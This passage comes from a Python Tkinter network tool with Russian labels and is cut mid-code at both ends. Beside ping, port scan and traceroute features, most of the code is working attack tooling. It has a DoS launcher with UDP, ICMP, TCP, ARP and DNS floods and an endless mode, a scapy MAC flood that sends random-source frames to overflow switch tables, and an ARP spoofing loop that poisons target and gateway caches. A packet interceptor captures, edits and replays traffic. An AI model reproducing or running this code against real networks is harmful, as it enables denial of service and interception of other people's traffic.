        button_frame1.grid(row=1, column=0, columnspan=4, pady=6)
        
        ttk.Button(button_frame1, text="ICMP Ping", 
                  command=self.run_ping, width=12).pack(side='left', padx=3)
        ttk.Button(button_frame1, text="Port Scan", 
                  command=self.run_port_scan, width=12).pack(side='left', padx=3)
        ttk.Button(button_frame1, text="Traceroute", 
                  command=self.run_traceroute, width=12).pack(side='left', padx=3)
        
        # Кнопки сетевой информации
        button_frame2 = ttk.Frame(input_frame)
        button_frame2.grid(row=2, column=0, columnspan=4, pady=6)
        
        ttk.Button(button_frame2, text="Таблица маршрутизации", 
                  command=self.show_ip_route, width=20).pack(side='left', padx=2)
        ttk.Button(button_frame2, text="Сетевые адаптеры", 
                  command=self.show_network_info, width=18).pack(side='left', padx=2)
        
        
        output_frame = ttk.LabelFrame(main_frame, text="Результаты")
        output_frame.pack(fill='both', expand=True, padx=5, pady=5)
        
        self.access_output = scrolledtext.ScrolledText(output_frame, height=18, wrap=tk.WORD, font=('Consolas', 8))
        self.access_output.pack(fill='both', expand=True, padx=5, pady=5)
        
        ttk.Button(output_frame, text="Сохранить логи", 
                  command=lambda: self.save_log(self.access_output), width=14).pack(pady=4)
    
    def get_network_adapters(self):
        try:
            interfaces = get_if_list()
            result = []
            for iface in interfaces:
                display_name = iface
                if not iface.startswith(r'\Device\NPF_'):
                    display_name = r'\Device\NPF_' + iface
                
                result.append(f"Интерфейс: {display_name}")
                
                try:
                    ip = get_if_addr(iface)
                    mac = get_if_hwaddr(iface)
                    result.append(f"  IP: {ip}, MAC: {mac}")
                except Exception as e:
                    result.append(f"  Не удалось получить информацию об интерфейсе")
                result.append("")
            
            return "\n".join(result)
        except Exception as e:
            return f"Ошибка получения информации об сетевых интерфейсах: {str(e)}"

    def get_ip_route_formatted(self):
        try:
            result = subprocess.run(['route', 'print'], capture_output=True, text=True, encoding='cp866')
            lines = result.stdout.split('\n')
            
            formatted_lines = []
            for line in lines:
                if line.strip():
                    formatted_lines.append(line)
            
            return "\n".join(formatted_lines)
        except Exception as e:
            return f"Ошибка получения таблицы маршрутизации: {str(e)}"

    def run_traceroute(self):
        def traceroute_worker():
            ip = self.access_ip.get()
            try:
                self.access_output.insert('end', f"Traceroute к {ip}...\n")
                self.access_output.see('end')
                
                if os.name == 'nt':
                    cmd = ['tracert', '-d', '-h', '30', '-w', '1000', ip]
                else:
                    cmd = ['traceroute', '-n', '-m', '30', '-w', '1', ip]
                
                process = subprocess.Popen(
                    cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    encoding='cp866' if os.name == 'nt' else 'utf-8'
                )
                
                for line in iter(process.stdout.readline, ''):
                    self.access_output.insert('end', line)
                    self.access_output.see('end')
                    self.root.update()
                
                process.stdout.close()
                process.wait()
                
                self.access_output.insert('end', f"\nTraceroute завершен.\n")
                self.access_output.see('end')
                
            except Exception as e:
                self.access_output.insert('end', f"Ошибка Traceroute: {str(e)}\n")
        
        threading.Thread(target=traceroute_worker, daemon=True).start()

    def show_ip_route(self):
        def worker():
            self.access_output.insert('end', "=== ТАБЛИЦА МАРШРУТИЗАЦИИ ===\n\n")
            route_info = self.get_ip_route_formatted()
            self.access_output.insert('end', route_info)
            self.access_output.insert('end', "\n" + "="*50 + "\n")
            self.access_output.see('end')
        
        threading.Thread(target=worker, daemon=True).start()

    def show_network_info(self):
        try:
            self.access_output.insert('end', "=== СЕТЕВЫЕ ИНТЕРФЕЙСЫ ===\n\n")
            interface_info = self.get_network_adapters()
            self.access_output.insert('end', interface_info)
            self.access_output.insert('end', "\n" + "="*50 + "\n")
            self.access_output.see('end')
        except Exception as e:
            self.access_output.insert('end', f"Ошибка: {str(e)}\n")

    def run_ping(self):
        """Запуск ping"""
        def ping_worker():
            ip = self.access_ip.get()
            try:
                process = subprocess.Popen(
                    ['ping', '-n', '4', ip],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    encoding='cp866'
                )
                
                for line in iter(process.stdout.readline, ''):
                    self.access_output.insert('end', line)
                    self.access_output.see('end')
                    self.root.update()
                
                process.stdout.close()
                process.wait()
                
            except Exception as e:
                self.access_output.insert('end', f"Ошибка: {str(e)}\n")
        
        threading.Thread(target=ping_worker, daemon=True).start()

    def run_port_scan(self):
        def port_scan_worker():
            ip = self.access_ip.get()
            common_ports = [21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 3389] 
            
            self.access_output.insert('end', f"Сканирование портов {ip}...\n")
            
            for port in common_ports:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    result = sock.connect_ex((ip, port))
                    if result == 0:
                        self.access_output.insert('end', f"Порт {port} открыт\n")
                    sock.close()
                except:
                    pass
                
            self.access_output.insert('end', "Сканирование завершено\n")
        
        threading.Thread(target=port_scan_worker, daemon=True).start()

    def start_custom_attack(self):
        if self.custom_attack_running:
            return
            
        self.custom_attack_running = True
        self.custom_start_btn.config(state='disabled')
        self.custom_stop_btn.config(state='normal')
        
        try:
            target_ip = self.custom_ip.get()
            protocol = self.custom_protocol.get()
            port = int(self.custom_port.get())
            packet_size = int(self.custom_packet_size.get())
            packet_count = int(self.custom_packet_count.get())
            delay = float(self.custom_delay.get())
            continuous = self.custom_continuous.get()
            interface = self.custom_interface.get()
            
            if delay < 0:
                delay = 0
            
            self.custom_log.insert('end', "="*50 + "\n")
            self.custom_log.insert('end', f"ЗАПУСК DoS АТАКИ\n")
            self.custom_log.insert('end', f"ЦЕЛЬ: {target_ip}\n")
            self.custom_log.insert('end', f"ПРОТОКОЛ: {protocol}\n")
 
            self.custom_log.insert('end', f"РАЗМЕР ПАКЕТА: {packet_size} байт\n")
            self.custom_log.insert('end', f"РЕЖИМ: {'БЕСКОНЕЧНЫЙ' if continuous else f'{packet_count} пакетов'}\n")
            self.custom_log.insert('end', f"ЗАДЕРЖКА: {delay} сек\n")
            self.custom_log.insert('end', f"ИНТЕРФЕЙС: {interface}\n")
            self.custom_log.insert('end', "="*50 + "\n")

            if protocol == "UDP":
                self.raw_attack.start_udp_attack(
                    target_ip, port, packet_size, packet_count, 
                    continuous, interface, self._log_custom
                )
            elif protocol == "ICMP":
                self.raw_attack.start_icmp_attack(
                    target_ip, packet_size, packet_count, 
                    continuous, interface, self._log_custom
                )
            elif protocol == "TCP":
                self.scapy_attack.start_tcp_attack(
                    target_ip, port, packet_size, packet_count,
                    continuous, interface, self._log_custom
                )
            elif protocol == "ARP":
                self.scapy_attack.start_arp_attack(
                    target_ip, packet_count, continuous, interface, self._log_custom
                )
            elif protocol == "DNS":
                self.scapy_attack.start_dns_attack(
                    target_ip, packet_count, continuous, interface, self._log_custom
                )
            
            self.custom_attack_stats = {
                'start_time': time.time(),
                'sent_packets': 0,
                'received_packets': 0,
                'last_update': time.time(),
                'last_sent': 0,
                'total_bytes': 0
            }
            
            self.update_custom_attack_stats()
            
            self.status_var.set(f"DoS атака запущена: {protocol} → {target_ip}")
            
        except ValueError as e:
            messagebox.showerror("Ошибка", f"Некорректные параметры:\n{str(e)}")
            self.stop_custom_attack()
        except Exception as e:
            messagebox.showerror("Ошибка", f"Не удалось запустить атаку:\n{str(e)}")
            self.stop_custom_attack()
    
    def _log_custom(self, message):
        self.custom_log.insert('end', f"{message}\n")
        self.custom_log.see('end')
    
    def stop_custom_attack(self):
        if not self.custom_attack_running:
            return
            
        self.custom_attack_running = False
        self.custom_start_btn.config(state='normal')
        self.custom_stop_btn.config(state='disabled')

        if hasattr(self.raw_attack, 'running') and self.raw_attack.running:
            raw_stats = self.raw_attack.stop()
            sent_packets = raw_stats['total_sent']
            total_bytes = raw_stats['total_bytes']
        elif hasattr(self.scapy_attack, 'running') and self.scapy_attack.running:
            scapy_stats = self.scapy_attack.stop()
            sent_packets = scapy_stats['total_sent']
            total_bytes = scapy_stats['total_bytes']
        else:
            sent_packets = 0
            total_bytes = 0
        
        total_time = time.time() - self.custom_attack_stats['start_time']
        avg_rate = sent_packets / total_time if total_time > 0 else 0
        
        self.custom_log.insert('end', "="*50 + "\n")
        self.custom_log.insert('end', f"DoS АТАКА ОСТАНОВЛЕНА\n")
        self.custom_log.insert('end', f"ФИНАЛЬНЫЕ РЕЗУЛЬТАТЫ:\n")
        self.custom_log.insert('end', f"Всего пакетов: {sent_packets:,}\n")
        self.custom_log.insert('end', f"Всего байт: {total_bytes:,}\n")
        self.custom_log.insert('end', f"Общее время: {total_time:.1f} сек\n")
        self.custom_log.insert('end', f"Средняя скорость: {int(avg_rate):,} пак/сек\n")
        
        self.custom_log.insert('end', "="*50 + "\n")
        
        self.status_var.set("DoS атака остановлена")
    
    def update_custom_attack_stats(self):
        if not self.custom_attack_running:
            return
            
        current_time = time.time()

        if self.raw_attack.running:
            with self.raw_attack.stats_lock:
                sent_packets = self.raw_attack.stats['total_sent']
        elif self.scapy_attack.running:
            with self.scapy_attack.stats_lock:
                sent_packets = self.scapy_attack.stats['total_sent']
        else:
            sent_packets = 0
        
        # Обновляем GUI
        self.custom_sent.config(text=f"{sent_packets:,}")
        
        duration = current_time - self.custom_attack_stats['start_time']
        hours = int(duration // 3600)
        minutes = int((duration % 3600) // 60)
        seconds = int(duration % 60)
        self.custom_time.config(text=f"{hours:02d}:{minutes:02d}:{seconds:02d}")

        if self.custom_attack_running:
            self.root.after(1000, self.update_custom_attack_stats)

    def generate_random_mac(self):
        return "%02x:%02x:%02x:%02x:%02x:%02x" % (
            random.randint(0, 255),
            random.randint(0, 255),
            random.randint(0, 255),
            random.randint(0, 255),
            random.randint(0, 255),
            random.randint(0, 255)
        )

    def start_mac_flood(self):
        self.mac_flood_running = True
        self.mac_flood_start_btn.config(state='disabled')
        self.mac_flood_stop_btn.config(state='normal')
        
        try:
            count = int(self.mac_flood_count.get())
            packet_size = int(self.mac_flood_size.get())
            delay = float(self.mac_flood_delay.get())
        except:
            count = 10000
            packet_size = 128
            delay = 0.001
        
        self.mac_flood_stats = {
            'start_time': time.time(),
            'sent_packets': 0,
            'unique_macs': set(),
            'last_update': time.time(),
            'last_sent': 0
        }
        
        self.mac_flood_thread = threading.Thread(
            target=self.mac_flood_worker,
            args=(self.mac_flood_interface.get(), count, packet_size, delay)
        )
        self.mac_flood_thread.daemon = True
        self.mac_flood_thread.start()
        
        self.update_mac_flood_stats()
        
        self.mac_flood_log.insert('end', f"Запущен MAC flood\n")
        self.mac_flood_log.insert('end', f"Целевой MAC: {self.mac_flood_target.get()}\n")
        self.mac_flood_log.insert('end', f"Пакетов: {count}, Размер: {packet_size} байт\n")
        self.mac_flood_log.insert('end', f"Задержка: {delay} сек\n")
        self.status_var.set("MAC flood запущен")

    def stop_mac_flood(self):
        self.mac_flood_running = False
        self.mac_flood_start_btn.config(state='normal')
        self.mac_flood_stop_btn.config(state='disabled')
        
        if self.mac_flood_thread and self.mac_flood_thread.is_alive():
            self.mac_flood_thread.join(timeout=1.0)
            
        total_time = time.time() - self.mac_flood_stats['start_time']
        total_packets = self.mac_flood_stats['sent_packets']
        
        self.mac_flood_log.insert('end', "MAC flood остановлен\n")
        self.mac_flood_log.insert('end', f"Итоговая статистика:\n")
        self.mac_flood_log.insert('end', f"Всего пакетов: {total_packets}\n")
        self.mac_flood_log.insert('end', f"Уникальных MAC: {len(self.mac_flood_stats['unique_macs'])}\n")
        self.mac_flood_log.insert('end', f"Общее время: {total_time:.1f} сек\n")
        self.mac_flood_log.insert('end', f"Средняя скорость: {int(total_packets/total_time) if total_time > 0 else 0} пак/сек\n")
        
        self.status_var.set("MAC flood остановлен")

    def update_mac_flood_stats(self):
        if not self.mac_flood_running:
            return
            
        current_time = time.time()
        duration = current_time - self.mac_flood_stats['start_time']
        time_diff = current_time - self.mac_flood_stats['last_update']
        
        if time_diff >= 1:
            packets_sent = self.mac_flood_stats['sent_packets'] - self.mac_flood_stats.get('last_sent', 0)
            current_rate = packets_sent / time_diff if time_diff > 0 else 0
            
            self.mac_flood_rate.config(text=f"{int(current_rate)} пак/сек")
            self.mac_flood_stats['last_update'] = current_time
            self.mac_flood_stats['last_sent'] = self.mac_flood_stats['sent_packets']
        
        self.mac_flood_sent.config(text=str(self.mac_flood_stats['sent_packets']))
        self.mac_flood_unique.config(text=str(len(self.mac_flood_stats['unique_macs'])))
        
        hours = int(duration // 3600)
        minutes = int((duration % 3600) // 60)
        seconds = int(duration % 60)
        self.mac_flood_time.config(text=f"{hours:02d}:{minutes:02d}:{seconds:02d}")
        
        if self.mac_flood_running:
            self.root.after(1000, self.update_mac_flood_stats)

    def mac_flood_worker(self, interface, total_count, packet_size, delay):
        try:
            packet_count = 0
            used_macs = set()
            target_mac = self.mac_flood_target.get()
            use_random_mac = self.mac_flood_random.get()
            
            start_time = time.time()
            
            self.mac_flood_log.insert('end', f"MAC flood атаки\n")
            
            while self.mac_flood_running and packet_count < total_count:
                if use_random_mac:
                    src_mac = self.generate_random_mac()
                    while src_mac in used_macs:
                        src_mac = self.generate_random_mac()
                    used_macs.add(src_mac)
                else:
                    src_mac = self.generate_random_mac()
                
                payload = b'X' * max(0, packet_size - 14)
                
                packet = Ether(src=src_mac, dst=target_mac) / Raw(load=payload)
                
                try:
                    sendp(packet, iface=interface, verbose=0)
                    packet_count += 1
                    
                    self.mac_flood_stats['sent_packets'] = packet_count
                    self.mac_flood_stats['unique_macs'] = used_macs
                    
                except Exception as e:
                    self.mac_flood_log.insert('end', f"Ошибка отправки пакета: {str(e)}\n")
                    break
                
                if delay > 0:
                    sleep_time = delay
                    interval = 0.01
                    while sleep_time > 0 and self.mac_flood_running:
                        time.sleep(min(interval, sleep_time))
                        sleep_time -= interval
                
                if packet_count % 1000 == 0:
                    elapsed = time.time() - start_time
                    rate = packet_count / elapsed if elapsed > 0 else 0
                    self.mac_flood_log.insert('end', 
                        f"Отправлено {packet_count}/{total_count} пакетов "
                        f"(Скорость: {int(rate)} пак/сек, Уникальных MAC: {len(used_macs)})\n")
                    self.mac_flood_log.see('end')
            
            total_time = time.time() - start_time
            final_rate = packet_count / total_time if total_time > 0 else 0
            self.mac_flood_log.insert('end', 
                f"MAC flood завершен. Итого: {packet_count} пакетов, "
                f"{len(used_macs)} уникальных MAC")
            self.status_var.set("MAC flood завершен")
                        
        except Exception as e:
            self.mac_flood_log.insert('end', f"Ошибка MAC flood: {str(e)}\n")

    def start_arp_spoof(self):
        """Запуск ARP Spoofing атаки"""
        self.arp_spoof_running = True
        self.arp_spoof_start_btn.config(state='disabled')
        self.arp_spoof_stop_btn.config(state='normal')
        
        try:
            interval = float(self.arp_spoof_interval.get())
        except:
            interval = 2.0
        
        self.arp_spoof_stats = {
            'start_time': time.time(),
            'sent_packets': 0,
            'last_update': time.time(),
            'last_sent': 0
        }
        
        self.arp_spoof_thread = threading.Thread(
            target=self.arp_spoof_worker,
            args=(self.arp_target_ip.get(), self.arp_gateway_ip.get(), 
                  self.arp_spoof_interface.get(), interval)
        )
        self.arp_spoof_thread.daemon = True
        self.arp_spoof_thread.start()
        
        self.update_arp_spoof_stats()
        
        self.arp_spoof_log.insert('end', f"Запущен ARP Spoofing (интервал: {interval} сек)\n")
        self.status_var.set("ARP Spoofing запущен")
    
    def stop_arp_spoof(self):
        self.arp_spoof_running = False
        self.arp_spoof_start_btn.config(state='normal')
        self.arp_spoof_stop_btn.config(state='disabled')
        
        if self.arp_spoof_thread and self.arp_spoof_thread.is_alive():
            self.arp_spoof_thread.join(timeout=1.0)
        
        total_time = time.time() - self.arp_spoof_stats['start_time']
        total_packets = self.arp_spoof_stats['sent_packets']
        
        self.arp_spoof_log.insert('end', "ARP Spoofing остановлен\n")
        self.arp_spoof_log.insert('end', f"Итоговая статистика:\n")
        self.arp_spoof_log.insert('end', f"Всего пакетов: {total_packets}\n")
        self.arp_spoof_log.insert('end', f"Общее время: {total_time:.1f} сек\n")
        self.arp_spoof_log.insert('end', f"Средняя скорость: {int(total_packets/total_time) if total_time > 0 else 0} пак/сек\n")
        
        self.status_var.set("ARP Spoofing остановлен")
    
    def update_arp_spoof_stats(self):
        if not self.arp_spoof_running:
            return
            
        current_time = time.time()
        duration = current_time - self.arp_spoof_stats['start_time']
        time_diff = current_time - self.arp_spoof_stats['last_update']
        
        if time_diff >= 1:
            packets_sent = self.arp_spoof_stats['sent_packets'] - self.arp_spoof_stats.get('last_sent', 0)
            current_rate = packets_sent / time_diff if time_diff > 0 else 0
            
            self.arp_spoof_rate.config(text=f"{int(current_rate)} пак/сек")
            self.arp_spoof_stats['last_update'] = current_time
            self.arp_spoof_stats['last_sent'] = self.arp_spoof_stats['sent_packets']
        
        self.arp_spoof_sent.config(text=str(self.arp_spoof_stats['sent_packets']))
        
        hours = int(duration // 3600)
        minutes = int((duration % 3600) // 60)
        seconds = int(duration % 60)
        self.arp_spoof_time.config(text=f"{hours:02d}:{minutes:02d}:{seconds:02d}")
        
        if self.arp_spoof_running:
            self.root.after(1000, self.update_arp_spoof_stats)
    
    def arp_spoof_worker(self, target_ip, gateway_ip, interface, interval):
        try:
            packet_count = 0
            
            attacker_mac = get_if_hwaddr(interface)
            
            self.arp_spoof_log.insert('end', f"Начало ARP Spoofing атаки\n")
            self.arp_spoof_log.insert('end', f"Цель: {target_ip}, Шлюз: {gateway_ip}\n")
            self.arp_spoof_log.insert('end', f"MAC атакующего: {attacker_mac}\n")
            
            while self.arp_spoof_running:
                arp_to_target = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(
                    op=2,
                    psrc=gateway_ip,
                    hwsrc=attacker_mac,
                    pdst=target_ip,
                    hwdst="ff:ff:ff:ff:ff:ff"
                )
                
                arp_to_gateway = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(
                    op=2,
                    psrc=target_ip,
                    hwsrc=attacker_mac,
                    pdst=gateway_ip,
                    hwdst="ff:ff:ff:ff:ff:ff"
                )
                
                sendp(arp_to_target, iface=interface, verbose=0)
                sendp(arp_to_gateway, iface=interface, verbose=0)
                
                packet_count += 2
                self.arp_spoof_stats['sent_packets'] = packet_count
                
                if packet_count % 10 == 0:
                    self.arp_spoof_log.insert('end', f"Отправлено {packet_count} ARP Spoofing пакетов\n")
                    self.arp_spoof_log.see('end')
                    self.status_var.set(f"ARP Spoofing: {packet_count} пакетов")
                
                sleep_time = interval
                interval_step = 0.1
                while sleep_time > 0 and self.arp_spoof_running:
                    time.sleep(min(interval_step, sleep_time))
                    sleep_time -= interval_step
                        
        except Exception as e:
            self.arp_spoof_log.insert('end', f"Ошибка ARP Spoofing: {str(e)}\n")

    def setup_intercept_tab(self, parent):
        main_frame = ttk.Frame(parent)
        main_frame.pack(fill='both', expand=True, padx=8, pady=8)
        
        left_frame = ttk.Frame(main_frame)
        left_frame.pack(side='left', fill='both', expand=True, padx=5, pady=5)
        
        right_frame = ttk.Frame(main_frame)
        right_frame.pack(side='right', fill='y', padx=5, pady=5)
        
        params_frame = ttk.LabelFrame(left_frame, text="Параметры перехвата пакетов")
        params_frame.pack(fill='x', padx=5, pady=5)
        
        row1 = ttk.Frame(params_frame)
        row1.pack(fill='x', padx=4, pady=3)
        
        ttk.Label(row1, text="Интерфейс:").pack(side='left', padx=2)
        self.intercept_interface = ttk.Combobox(row1, width=15, font=('Arial', 9), values=self.network_interfaces)
        self.intercept_interface.pack(side='left', padx=2)
        self.intercept_interface.set(self.network_interfaces[0] if self.network_interfaces else "Ethernet")
        
        ttk.Label(row1, text="Фильтр:").pack(side='left', padx=8)
        self.intercept_filter = ttk.Combobox(row1, width=18, font=('Arial', 9), values=[
            "icmp or tcp", "tcp", "udp", "icmp", "arp", "not arp", "not stp", 
            "port 80", "port 443", "host 192.168.1.1", "tcp port 80", "udp port 53"
        ])
        self.intercept_filter.pack(side='left', padx=2)
        self.intercept_filter.set("not (arp or stp or cdp)")
        
        row2 = ttk.Frame(params_frame)
        row2.pack(fill='x', padx=4, pady=3)
        
        ttk.Label(row2, text="Кол-во ответов:").pack(side='left', padx=2)
        self.intercept_response_count = ttk.Entry(row2, width=8, font=('Arial', 9))
        self.intercept_response_count.pack(side='left', padx=2)
        self.intercept_response_count.insert(0, "0")
        
        ttk.Label(row2, text="Кол-во для отпр.:").pack(side='left', padx=10)
        self.send_count = ttk.Entry(row2, width=8, font=('Arial', 9))
        self.send_count.pack(side='left', padx=2)
        self.send_count.insert(0, "10")
        
        button_frame = ttk.Frame(params_frame)
        button_frame.pack(fill='x', padx=4, pady=6)
        
        self.intercept_start_btn = ttk.Button(button_frame, text="Начать перехват", 
                                        command=self.start_packet_intercept, width=14)
        self.intercept_start_btn.pack(side='left', padx=2)
        
        self.intercept_stop_btn = ttk.Button(button_frame, text="Остановить", 
                                       command=self.stop_packet_intercept, width=12, state='disabled')
        self.intercept_stop_btn.pack(side='left', padx=2)
        
        ttk.Button(button_frame, text="Захватить выбранный", 
              command=self.capture_selected_intercept_packet, width=18).pack(side='left', padx=2)
        ttk.Button(button_frame, text="Редактировать", 
              command=self.edit_selected_intercept_packet, width=13).pack(side='left', padx=1)
        
        packets_frame = ttk.LabelFrame(left_frame, text="Перехваченные пакеты")
        packets_frame.pack(fill='both', expand=True, padx=5, pady=5)
        
        columns = ("№", "Время", "Источник", "Назначение", "Протокол", "Длина", "Информация")
        self.intercept_tree = ttk.Treeview(packets_frame, columns=columns, show='headings', height=12)
        
        for col in columns:
            self.intercept_tree.heading(col, text=col)
            self.intercept_tree.column(col, width=90)
        
        self.intercept_tree.column("№", width=40)
        self.intercept_tree.column("Время", width=80)
        self.intercept_tree.column("Источник", width=120)
        self.intercept_tree.column("Назначение", width=120)
        self.intercept_tree.column("Протокол", width=70)
        self.intercept_tree.column("Длина", width=50)
        self.intercept_tree.column("Информация", width=150)
        
        tree_scroll = ttk.Scrollbar(packets_frame, orient="vertical", command=self.intercept_tree.yview)
        self.intercept_tree.configure(yscrollcommand=tree_scroll.set)
        
        self.intercept_tree.pack(side='left', fill='both', expand=True)
        tree_scroll.pack(side='right', fill='y')
        
        control_frame = ttk.LabelFrame(right_frame, text="Управление пакетами")
        control_frame.pack(fill='x', padx=5, pady=5)
        
        info_frame = ttk.LabelFrame(control_frame, text="Текущие пакеты")
        info_frame.pack(fill='x', padx=5, pady=5)
        
        ttk.Label(info_frame, text="Захваченный:").pack(anchor='w', pady=1)
        self.captured_packet_info = ttk.Label(info_frame, text="Нет", foreground="#adb5bd", wraplength=300)
        self.captured_packet_info.pack(anchor='w', pady=1, fill='x')
        
        ttk.Label(info_frame, text="Отредактированный:").pack(anchor='w', pady=1)
        self.edited_packet_info = ttk.Label(info_frame, text="Нет", foreground="#adb5bd", wraplength=300)
        self.edited_packet_info.pack(anchor='w', pady=1, fill='x')
        
        send_frame = ttk.Frame(control_frame)
        send_frame.pack(fill='x', padx=5, pady=8)
        
        ttk.Button(send_frame, text="Отправить захваченный", 
              command=self.send_captured_packet, width=20).pack(pady=2)
        ttk.Button(send_frame, text="Отправить отредактированный", 
              command=self.send_edited_packet, width=20).pack(pady=2)
        
        ttk.Button(control_frame, text="Очистить список", 
              command=self.clear_intercept_list, width=20).pack(pady=5)
        
        log_frame = ttk.LabelFrame(right_frame, text="Лог перехвата")
        log_frame.pack(fill='both', expand=True, padx=5, pady=5)
        
        self.intercept_log = scrolledtext.ScrolledText(log_frame, height=20, wrap=tk.WORD, font=('Consolas', 8))
        self.intercept_log.pack(fill='both', expand=True, padx=5, pady=5)
        
        ttk.Button(log_frame, text="Сохранить логи", 
              command=lambda: self.save_log(self.intercept_log), width=14).pack(pady=4)
        
        self.intercept_tree.bind('<<TreeviewSelect>>', self.on_intercept_packet_select)

    def on_intercept_packet_select(self, event):
        selection = self.intercept_tree.selection()
        if not selection:
            return
            
        item = selection[0]
        packet_info = self.intercept_tree.item(item, 'values')
        
        index = int(packet_info[0]) - 1
        if 0 <= index < len(self.intercept_packets):
            self.selected_packet = self.intercept_packets[index]
            
            self.intercept_log.insert('end', f"\n--- ВЫБРАН ПАКЕТ #{packet_info[0]} ---\n")
            self.intercept_log.insert('end', f"Время: {packet_info[1]}\n")
            self.intercept_log.insert('end', f"Источник: {packet_info[2]}\n")
            self.intercept_log.insert('end', f"Назначение: {packet_info[3]}\n")
            self.intercept_log.insert('end', f"Протокол: {packet_info[4]}\n")
            self.intercept_log.insert('end', f"Длина: {packet_info[5]} байт\n")
            self.intercept_log.insert('end', f"Информация: {packet_info[6]}\n")
            self.intercept_log.see('end')

    def capture_selected_intercept_packet(self):
        if not self.selected_packet:
            messagebox.showwarning("Предупреждение", "Сначала выберите пакет из списка")
            return
            
        self.captured_packet = self.selected_packet
        self.captured_packet_info.config(text=f"Захвачен: {self.selected_packet.summary()}")
        self.intercept_log.insert('end', f"\nПакет захвачен для дальнейшего использования: {self.selected_packet.summary()}\n")
        self.intercept_log.see('end')

    def edit_selected_intercept_packet(self):
        if not self.selected_packet:
            messagebox.showwarning("Предупреждение", "Сначала выберите пакет из списка")
            return
            
        def callback(edited_packet, save_packet):
            try:
                interface = self.intercept_interface.get()
                
                if save_packet:
                    self.edited_packet = edited_packet
                    self.edited_packet_info.config(text=f"Отредактирован: {edited_packet.summary()}")
                    self.intercept_log.insert('end', f"\nПакет сохранен: {edited_packet.summary()}\n")
                
                self.intercept_log.see('end')
            except Exception as e:
                messagebox.showerror("Ошибка", f"Не удалось отправить пакет: {str(e)}")
        
        Editor(self.root, self.selected_packet, callback)

    def send_captured_packet(self):
        if self.captured_packet is None:
            self.intercept_log.insert('end', "Нет захваченного пакета для отправки!\n")
            return
            
        try:
            count = int(self.send_count.get())
            interface = self.intercept_interface.get()
            
            for i in range(count):
                sendp(self.captured_packet, iface=interface, verbose=0)
                
            self.intercept_log.insert('end', f"Отправлено {count} копий захваченного пакета\n")
        except Exception as e:
            self.intercept_log.insert('end', f"Ошибка отправки захваченного пакета: {str(e)}\n")

    def send_edited_packet(self):
        if self.edited_packet is None:
            self.intercept_log.insert('end', "Нет отредактированного пакета для отправки!\n")
            return
            
        try:
            count = int(self.send_count.get())
            interface = self.intercept_interface.get()
            
            for i in range(count):
                sendp(self.edited_packet, iface=interface, verbose=0)
                
            self.intercept_log.insert('end', f"Отправлено {count} копий отредактированного пакета\n")
            self.intercept_log.see('end')
        except Exception as e:
            self.intercept_log.insert('end', f"Ошибка отправки отредактированного пакета: {str(e)}\n")

    def clear_intercept_list(self):
        for item in self.intercept_tree.get_children():
            self.intercept_tree.delete(item)
        self.intercept_packets.clear()
        self.intercept_log.insert('end', "\nСписок перехваченных пакетов очищен\n")
        self.intercept_log.see('end')

    def add_packet_to_intercept_tree(self, packet_data):
        packet_num, current_time, src, dst, protocol, length, info, packet = packet_data
        
        self.intercept_packets.append(packet)
        
        self.intercept_tree.insert("", "end", values=(packet_num, current_time, src, dst, protocol, length, info))
        
        if len(self.intercept_tree.get_children()) > 1000:
            self.intercept_tree.delete(self.intercept_tree.get_children()[0])
            self.intercept_packets.pop(0)

    def start_packet_intercept(self):
        self.packet_intercept_running = True
        self.intercept_start_btn.config(state='disabled')
        self.intercept_stop_btn.config(state='normal')
        
        self.intercept_thread = threading.Thread(
            target=self.intercept_worker,
            args=(self.intercept_filter.get(), self.intercept_interface.get())
        )
        self.intercept_thread.daemon = True
        self.intercept_thread.start()
        
        self.intercept_log.insert('end', "Запущен перехват пакетов с ответами\n")
        self.status_var.set("Перехват пакетов запущен")

    def stop_packet_intercept(self):
        self.packet_intercept_running = False
        self.intercept_start_btn.config(state='normal')
        self.intercept_stop_btn.config(state='disabled')
        self.intercept_log.insert('end', "Перехват пакетов остановлен\n")
        self.status_var.set("Перехват пакетов остановлен")

    def get_packet_info(self, packet):
        src = "Unknown"
        dst = "Unknown"
        protocol = "Unknown"
        length = len(packet)
        info = ""

        if packet.haslayer(Ether):
            src = packet[Ether].src
            dst = packet[Ether].dst
        
        if packet.haslayer(IP):
            src = packet[IP].src
            dst = packet[IP].dst
            protocol = "IP"
            
            if packet.haslayer(TCP):
                protocol = "TCP"
                info = f"Ports: {packet[TCP].sport}->{packet[TCP].dport} Flags: {packet[TCP].flags}"
            elif packet.haslayer(UDP):
                protocol = "UDP" 
                info = f"Ports: {packet[UDP].sport}->{packet[UDP].dport}"
            elif packet.haslayer(ICMP):
                protocol = "ICMP"
                info = f"Type: {packet[ICMP].type} Code: {packet[ICMP].code}"
        
        elif packet.haslayer(ARP):
            protocol = "ARP"
            info = f"Operation: {packet[ARP].op}"

        return (src, dst, protocol, length, info)

    def intercept_worker(self, filter_str, interface):
        def intercept_handler(packet):
            if not self.packet_intercept_running:
                return
                
            timestamp = time.strftime("%H:%M:%S")
            self.intercept_log.insert('end', f"[{timestamp}] Перехвачен пакет: {packet.summary()}\n")
            self.intercept_log.see('end')
            
            src, dst, protocol, length, info = self.get_packet_info(packet)
            packet_num = len(self.intercept_tree.get_children()) + 1
            packet_data = (packet_num, timestamp, src, dst, protocol, length, info, packet)
            self.root.after(0, self.add_packet_to_intercept_tree, packet_data)
            
            try:
                response_count = int(self.intercept_response_count.get())
            except:
                response_count = 4
                
            for i in range(response_count):
                response_packet = self.create_response_packet(packet)
                if response_packet:
                    try:
                        sendp(response_packet, iface=interface, verbose=0)
                        self.intercept_log.insert('end', f"  -> Отправлен ответный пакет {i+1}\n")
                        self.intercept_log.see('end')
                    except Exception as e:
                        self.intercept_log.insert('end', f"  -> Ошибка отправки: {str(e)}\n")
            
        try:
            sniff(filter=filter_str, iface=interface, prn=intercept_handler,
                  stop_filter=lambda x: not self.packet_intercept_running)
        except Exception as e:
            self.intercept_log.insert('end', f"Ошибка перехвата: {str(e)}\n")

    def create_response_packet(self, original_packet):
        try:
            if original_packet.haslayer(ICMP) and original_packet[ICMP].type == 8:
